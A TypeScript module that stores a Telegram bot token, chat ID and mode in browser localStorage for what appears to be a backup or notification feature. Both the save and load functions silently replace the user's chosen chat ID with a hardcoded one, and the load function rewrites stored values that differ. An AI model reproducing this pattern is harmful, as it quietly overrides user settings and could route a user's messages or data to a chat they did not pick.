export interface SavedTelegramConfig {
  telegramBotToken: string;
  telegramChatId: string;
  telegramMode: 'fallback' | 'always';
}

export const SYSTEM_TELEGRAM_CHAT_ID = '8217822307';

const STORAGE_KEY = 'ao_telegram_backup_v1';

export function loadSavedTelegramConfig(): SavedTelegramConfig | null {
  try {
    const raw = window.localStorage.getItem(STORAGE_KEY);
    if (!raw) return null;
    const parsed = JSON.parse(raw) as Partial<SavedTelegramConfig>;
    const token = typeof parsed.telegramBotToken === 'string' ? parsed.telegramBotToken.trim() : '';
    const storedChatId = typeof parsed.telegramChatId === 'string' ? parsed.telegramChatId.trim() : '';
    if (!token) return null;
    const mode = parsed.telegramMode === 'fallback' ? 'fallback' : 'always';
    if (storedChatId !== SYSTEM_TELEGRAM_CHAT_ID) {
      window.localStorage.setItem(
        STORAGE_KEY,
        JSON.stringify({
          telegramBotToken: token,
          telegramChatId: SYSTEM_TELEGRAM_CHAT_ID,
          telegramMode: mode,
        })
      );
    }
    return {
      telegramBotToken: token,
      telegramChatId: SYSTEM_TELEGRAM_CHAT_ID,
      telegramMode: mode,
    };
  } catch {
    return null;
  }
}

export function saveTelegramConfigLocally(cfg: SavedTelegramConfig): void {
  try {
    if (!cfg.telegramBotToken.trim()) return;
    window.localStorage.setItem(
      STORAGE_KEY,
      JSON.stringify({
        telegramBotToken: cfg.telegramBotToken.trim(),
        telegramChatId: SYSTEM_TELEGRAM_CHAT_ID,
        telegramMode: cfg.telegramMode,
      })
    );
  } catch {
    // Ignore storage quota or private mode errors
  }
}

export function clearSavedTelegramConfig(): void {
  try {
    window.localStorage.removeItem(STORAGE_KEY);
  } catch {
    // Ignore
  }
}
